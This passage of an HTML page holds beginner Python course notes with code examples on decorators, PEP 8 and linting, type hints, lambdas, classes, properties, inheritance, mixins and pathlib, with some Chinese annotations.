class="hljs-title">color</span>(<span class="hljs-params">color</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wrapper</span>(<span class="hljs-params">func</span>):</span><br><span class="hljs-meta">        @functools.wraps(<span class="hljs-params">func</span>)</span><br>        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">runner</span>(<span class="hljs-params">*args, **kwargs</span>):</span><br>            <span class="hljs-built_in">print</span>(color + <span class="hljs-string">&#x27;changing to blue&#x27;</span>)<br>            func(*args, **kwargs)<br>        <span class="hljs-keyword">return</span> runner<br>    <span class="hljs-keyword">return</span> wrapper<br><br><span class="hljs-meta">@color(<span class="hljs-params">color=Fore.BLUE</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">greeter</span>():</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Hello, world!!&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Just saying hi again&#x27;</span>)<br><br>greeter()<br></code></pre></td></tr></table></figure><h2 id="二、More-python-for-beginners"><a href="#二、More-python-for-beginners" class="headerlink" title="二、More python for beginners"></a>二、More python for beginners</h2><p><strong>What are we doing here?</strong></p><ul><li><p>Walk through additional Python concepts</p></li><li><p>Give you more tools for your toolbox</p></li><li><p>Link to more resources</p></li></ul><h3 id="1、Formatting-and-linting"><a href="#1、Formatting-and-linting" class="headerlink" title="1、Formatting and linting"></a>1、Formatting and linting</h3><p><strong>This is valid Python code</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">x = <span class="hljs-number">12</span><br><span class="hljs-keyword">if</span> x== <span class="hljs-number">24</span>:<br> <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Is valid&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Not valid&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">helper</span>(<span class="hljs-params">name=<span class="hljs-string">&#x27;sample&#x27;</span></span>):</span><br> <span class="hljs-keyword">pass</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">another</span>(<span class="hljs-params"> name = <span class="hljs-string">&#x27;sample&#x27;</span> </span>):</span><br>         <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><p><strong>Formatting matters</strong></p><ul><li>Makes code readable</li><li>Easier to debug</li><li>Consistency helps everyone</li></ul><p><strong>PEP 8</strong></p><ul><li><p>Python Enhancement Proposal #8</p></li><li><p>All about formatting</p></li><li>Common rules:<ul><li>Spaces, not tabs</li><li>variable_name, not variableName or VariableName</li><li>Avoid extraneous whitespace<ul><li>{‘good’: 42}</li><li>{ ‘bad’ : 20 }</li></ul></li></ul></li></ul><p><strong>Linting</strong></p><ul><li>Identify formatting issues <ul><li>Common for all languages </li></ul></li><li>Pylint for Python <ul><li>Windows: pip install pylint </li><li>macOS or Linux: pip3 install pylint </li></ul></li><li>Configurable to ignore certain rules <ul><li>Avoid doing this </li></ul></li><li>Automatically run by Visual Studio Code </li></ul><p><strong>Use docstring for inline documentation</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">print_hello</span>(<span class="hljs-params">name: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Greets the user by name</span><br><span class="hljs-string"></span><br><span class="hljs-string">Parameters:</span><br><span class="hljs-string">name (str): The name of the user</span><br><span class="hljs-string">Returns:</span><br><span class="hljs-string">str: The greeting</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Hello, &#x27;</span> + name)<br></code></pre></td></tr></table></figure><p><strong>The challenge with weakly typed languages</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_greeting</span>(<span class="hljs-params">name</span>):</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello, &#x27;</span> + name<br><br>message = get_greeting(<span class="hljs-number">42</span>)<br><span class="hljs-built_in">print</span>(message)<br></code></pre></td></tr></table></figure><p><strong>Type hints</strong></p><ul><li><p>Tell the editor and linter what data types to expect</p></li><li><p><strong>DOES NOT</strong> cause “compiler” errors</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#            parameter type   return type</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_greeting</span>(<span class="hljs-params">name: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello, &#x27;</span> + name<br></code></pre></td></tr></table></figure><h3 id="2、Lambdas"><a href="#2、Lambdas" class="headerlink" title="2、Lambdas"></a>2、Lambdas</h3><p><strong>Sort some objects</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">presenters = [<br>  &#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;Susan&#x27;</span>, <span class="hljs-string">&#x27;age&#x27;</span>: <span class="hljs-number">50</span>&#125;,<br>  &#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;Christopher&#x27;</span>, <span class="hljs-string">&#x27;age&#x27;</span>: <span class="hljs-number">47</span>&#125;<br>]<br><br>presenters.sort()<br><span class="hljs-built_in">print</span>(presenters)<br></code></pre></td></tr></table></figure><p><strong>Notes about <code>sort</code></strong></p><ul><li><code>sort</code> can automatically handle primitive types and strings</li><li>If we need to do anything complex we need to tell <code>sort</code> how to sort</li><li>In this case we just need to specify whether to sort by age or name</li><li>the key parameter allows you to pass in a function to call for each list element before it compares items for sorting</li></ul><p><strong>Sort by name</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sorter</span>(<span class="hljs-params">item</span>):</span><br>    <span class="hljs-keyword">return</span> item[<span class="hljs-string">&#x27;name&#x27;</span>]<br><br>presenters = [<br>  &#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;Susan&#x27;</span>, <span class="hljs-string">&#x27;age&#x27;</span>: <span class="hljs-number">50</span>&#125;,<br>  &#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;Christopher&#x27;</span>, <span class="hljs-string">&#x27;age&#x27;</span>: <span class="hljs-number">47</span>&#125;<br>]<br><br>presenters.sort(key=sorter)<br><span class="hljs-built_in">print</span>(presenters)<br></code></pre></td></tr></table></figure><p><strong>Do the same thing inline</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">presenters = [<br>  &#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;Susan&#x27;</span>, <span class="hljs-string">&#x27;age&#x27;</span>: <span class="hljs-number">50</span>&#125;,<br>  &#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;Christopher&#x27;</span>, <span class="hljs-string">&#x27;age&#x27;</span>: <span class="hljs-number">47</span>&#125;<br>]<br><br>presenters.sort(key=<span class="hljs-keyword">lambda</span> item: item[<span class="hljs-string">&#x27;name&#x27;</span>])<br><span class="hljs-built_in">print</span>(presenters)<br></code></pre></td></tr></table></figure><p><strong>Sort by name length (short to long)</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">presenters = [<br>  &#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;Susan&#x27;</span>, <span class="hljs-string">&#x27;age&#x27;</span>: <span class="hljs-number">50</span>&#125;,<br>  &#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;Christopher&#x27;</span>, <span class="hljs-string">&#x27;age&#x27;</span>: <span class="hljs-number">47</span>&#125;<br>]<br><br>presenters.sort(key=<span class="hljs-keyword">lambda</span> item: <span class="hljs-built_in">len</span>(item[<span class="hljs-string">&#x27;name&#x27;</span>]))<br><span class="hljs-built_in">print</span>(presenters)<br></code></pre></td></tr></table></figure><h3 id="3、Classes"><a href="#3、Classes" class="headerlink" title="3、Classes"></a>3、Classes</h3><p><strong>Classes define data structures and behavior</strong></p><ul><li><p>Why use classes</p><ul><li>Create reusable components</li><li>Group data and operations together</li></ul></li><li><p>Moving parts</p><ul><li>Classes are nouns</li><li>Properties are adjectives</li><li>Methods are verbs</li></ul></li></ul><p><strong>Creating a class</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># PascalCasing(驼峰命名法)</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Presenter</span>():</span><br>    <span class="hljs-comment"># Constructor(构造函数)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, name</span>):</span><br>        <span class="hljs-comment"># Field(域) or property(属性)</span><br>self.name = name<br>    <span class="hljs-comment"># method(方法)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">say_hello</span>(<span class="hljs-params">self</span>):</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Hello, &#x27;</span> + self.name)<br></code></pre></td></tr></table></figure><p><strong>Using a class</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">presenter = Presenter(<span class="hljs-string">&#x27;Chris&#x27;</span>)<br>presenter.name = <span class="hljs-string">&#x27;Christopher&#x27;</span><br>presenter.say_hello()<br></code></pre></td></tr></table></figure><p><strong>Accessibility in Python</strong></p><ul><li><p><strong>EVERYTHING</strong> is public</p></li><li><p>Conventions for suggesting accessibility</p><ul><li>_ means avoid unless you really know what you’re doing</li><li>__ (double underscore) means <strong>do not use</strong></li></ul></li></ul><p><strong>Adding properties</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Presenter</span>():</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, name</span>):</span><br><span class="hljs-comment"># property (do not use self.__name = name) </span><br>self.name = name<br><br><span class="hljs-meta">@property</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">name</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;In the getting&#x27;</span>)<br><span class="hljs-keyword">return</span> self.__name<br><span class="hljs-meta">@name.setter</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">name</span>(<span class="hljs-params">self, value</span>):</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;In the setting&#x27;</span>)<br>self.__name = value<br></code></pre></td></tr></table></figure><p><strong>Using a property</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">presenter = Presenter(<span class="hljs-string">&#x27;Chris&#x27;</span>)<br>presenter.name = <span class="hljs-string">&#x27;Christopher&#x27;</span><br><span class="hljs-built_in">print</span>(presenter.name)<br></code></pre></td></tr></table></figure><h3 id="4、Inheritance"><a href="#4、Inheritance" class="headerlink" title="4、Inheritance"></a>4、Inheritance</h3><p><strong>Inheritance</strong></p><ul><li>Creates an “is a” relationship<ul><li>Student is a Person</li><li>MySqlConnection is a DatabaseConnection</li></ul></li><li>Composition (with properties) creates a “has a” relationship<ul><li>Student has a Class</li><li>DatabaseConnection has a ConnectionString</li></ul></li></ul><p><strong>Python inheritance in action</strong></p><ul><li><p>All methods are “virtual”</p><ul><li>Can override or redefine their behavior</li></ul></li><li><p>Keyword <code>super</code> to access parent class</p><ul><li><p>Constructor</p></li><li><p>Properties in methods</p></li></ul></li><li><p>Must always call parent constructor</p></li></ul><p><strong>Inheriting from a class</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, name</span>):</span><br>        self.name = name<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">say_hello</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Hello, &#x27;</span> + self.name)<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span>(<span class="hljs-params">Person</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, name, school</span>):</span><br>        <span class="hljs-built_in">super</span>().__init__(name)<br>        self.school = school<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sing_school_song</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Ode to &#x27;</span> + self.school)<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">say_hello</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-comment"># Let the parent do some work</span><br>        <span class="hljs-built_in">super</span>().say_hello()<br>        <span class="hljs-comment"># Add on custom code </span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;I am tired&#x27;</span>)<br></code></pre></td></tr></table></figure><p><strong>Using a derived class</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">student = Student(<span class="hljs-string">&#x27;Christopher&#x27;</span>, <span class="hljs-string">&#x27;UMD&#x27;</span>)<br>student.say_hello()<br>student.sing_school_song()<br><span class="hljs-comment"># What are you?</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">isinstance</span>(student, Student))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">isinstance</span>(student, Person))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">issubclass</span>(Student, Person))<br></code></pre></td></tr></table></figure><p><strong>Overriding <code>__str__</code></strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># YAGNA原则(you aren&#x27;t gonna need it)</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, name</span>):</span><br>        self.name = name<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">say_hello</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Hello, &#x27;</span> + self.name)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__str__</span>(<span class="hljs-params">self</span>):</span><br><span class="hljs-keyword">return</span> self.name<br><br>presenter = Presenter(<span class="hljs-string">&#x27;Christopher&#x27;</span>)<br><span class="hljs-built_in">print</span>(presenter)<br></code></pre></td></tr></table></figure><h3 id="5、Mixins-multiple-inheritance"><a href="#5、Mixins-multiple-inheritance" class="headerlink" title="5、Mixins (multiple inheritance)"></a>5、Mixins (multiple inheritance)</h3><p><strong>Mixins or multiple inheritance</strong></p><ul><li><p>Inherit from multiple classes</p></li><li><p>A little controversial</p><ul><li>Can get messy quickly</li><li>Many modern languages only support single inheritance</li></ul></li><li><p>Uses</p><ul><li>Enable functionality for frameworks such as Django</li><li>Streamline repetitious operations</li></ul></li></ul><p><strong>The scenario</strong></p><ul><li><p>What I want to create</p><ul><li>Helper database class</li><li>Create different types for different databases</li></ul></li><li><p>What I want it to be able to do</p><ul><li>Connect to a database</li><li>Log what it’s doing</li></ul></li></ul><p><strong>Supporting classes</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Loggable</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span><br>        self.title = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">log</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Log message from &#x27;</span> + self.title)<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Connection</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span><br>        self.server = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">connect</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Connecting to database on &#x27;</span> + self.server)<br></code></pre></td></tr></table></figure><p><strong>Create our “framework”</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">framework</span>(<span class="hljs-params">item</span>):</span><br><span class="hljs-comment"># Perform the connection</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(item, Connection):<br>        item.connect()<br><span class="hljs-comment"># Log the operation</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(item, Loggable):<br>        item.log()<br></code></pre></td></tr></table></figure><p><strong>Create our database class</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SqlDatabase</span>(<span class="hljs-params">Connection, Loggable</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-built_in">super</span>().__init__()<br>        self.title = <span class="hljs-string">&#x27;Sql Connection Demo&#x27;</span><br>        self.server = <span class="hljs-string">&#x27;Some_Server&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>Putting it to work</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Create an instance of our class</span><br>sql_connection = SqlDatabase()<br><span class="hljs-comment"># Use our framework</span><br>framework(sql_connection) <span class="hljs-comment"># connects and logs</span><br></code></pre></td></tr></table></figure><p><strong>Use framework</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Loggable</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span><br>        self.title = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">log</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Log message from &#x27;</span> + self.title)<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Connection</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span><br>        self.server = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">connect</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Connecting to database on &#x27;</span> + self.server)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">framework</span>(<span class="hljs-params">item</span>):</span><br><span class="hljs-comment"># Perform the connection</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(item, Connection):<br>        item.connect()<br><span class="hljs-comment"># Log the operation</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(item, Loggable):<br>        item.log()<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SqlDatabase</span>(<span class="hljs-params">Connection, Loggable</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-built_in">super</span>().__init__()<br>        self.title = <span class="hljs-string">&#x27;Sql Connection Demo&#x27;</span><br>        self.server = <span class="hljs-string">&#x27;Some_Server&#x27;</span><br><br><span class="hljs-comment"># Create an instance of our class</span><br>sql_connection = SqlDatabase()<br><span class="hljs-comment"># Use our framework</span><br>framework(sql_connection) <span class="hljs-comment"># connects and logs</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JustLog</span>(<span class="hljs-params">Loggable</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span><br>        self.title = <span class="hljs-string">&#x27;Just logging&#x27;</span><br>        <br>just_log = JustLog()<br>framework(just_log)<br></code></pre></td></tr></table></figure><h3 id="6、Managing-the-file-system"><a href="#6、Managing-the-file-system" class="headerlink" title="6、Managing the file system"></a>6、Managing the file system</h3><p><strong>Managing files</strong></p><ul><li><p>All the common operations are built into Python</p></li><li><p>Static or classless</p><ul><li><code>os.path</code></li><li>Old style</li></ul></li><li><p>Class based</p><ul><li><code>Path</code> from <code>pathlib</code> library</li><li>Python 3.6 or higher</li><li>Better performance as it can avoid calls to the OS</li></ul></li></ul><p><strong>Working with paths</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Python 3.6 or higher</span><br><span class="hljs-comment"># Grab the library</span><br><span class="hljs-keyword">from</span> pathlib <span class="hljs-keyword">import</span> Path<br><br><span class="hljs-comment"># What is the current working directory?</span><br>cwd = Path.cwd()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\nCurrent working directory:\n&#x27;</span> + <span class="hljs-built_in">str</span>(cwd))<br><br><span class="hljs-comment"># Create full path name by joining path and filename</span><br>new_file = Path.joinpath(cwd, <span class="hljs-string">&#x27;new_file.txt&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\nFull path:\n&#x27;</span> + <span class="hljs-built_in">str</span>(new_file))<br><br><span class="hljs-comment"># Check if file exists</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\nDoes that file exist? &#x27;</span> + <span class="hljs-built_in">str</span>(new_file.exists()) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br></code></pre></td></tr></table></figure><p><strong>Working with directories</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pathlib <span class="hljs-keyword">import</span> Path<br>cwd = Path.cwd()<br><br><span class="hljs-comment"># Get the parent directory</span><br>parent = cwd.parent<br><br><span class="hljs-comment"># Is this a directory?</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\nIs this a directory? &#x27;</span> + <span class="hljs-built_in">str</span>(parent.is_dir()))<br><br><span class="hljs-comment"># Is this a file?</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\nIs this a file? &#x27;</span> + <span class="hljs-built_in">str</span>(parent.is_file()))<br><br><span class="hljs-comment"># List child directories</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n-----directory contents-----&#x27;</span>)<br><span class="hljs-keyword">for</span> child <span class="hljs-keyword">in</span> parent.iterdir():<br>    <span class="hljs-keyword">if</span> child.is_dir():<br>        <span class="hljs-built_in">print</span>(child)<br></code></pre></td></tr></table></figure><p><strong>Working with files</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pathlib <span class="hljs-keyword">import</span> Path<br>cwd = 